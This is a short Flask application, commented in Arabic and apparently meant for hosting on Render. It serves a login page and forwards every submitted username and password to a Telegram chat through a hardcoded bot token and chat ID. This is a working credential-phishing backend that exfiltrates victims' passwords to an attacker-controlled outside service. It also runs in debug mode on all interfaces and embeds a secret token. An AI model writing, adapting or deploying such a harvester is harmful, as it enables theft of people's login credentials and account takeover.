from flask import Flask, render_template, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # إرسال المعلومات إلى Telegram
    telegram_token = "7740414650:AAG65IV7MKXdShAdjLjjilqPfZj68iTLDcA"  # ضع توكن البوت الخاص بك هنا
    chat_id = "6475356719"  # ضع معرف الشات الخاص بك هنا
    message = f"Username: {username}\nPassword: {password}"

    # طلب لإرسال الرسالة
    requests.post(
        f"https://api.telegram.org/bot{telegram_token}/sendMessage",
        data={'chat_id': chat_id, 'text': message}
    )

    return "Login information sent to Telegram!"

if __name__ == '__main__':
    # تعيين المنفذ والمضيف ليعمل التطبيق على Render
    port = int(os.environ.get("PORT", 5000))  # منفذ افتراضي 5000 إذا لم يتم تحديد PORT
    app.run(host="0.0.0.0", port=port, debug=True)
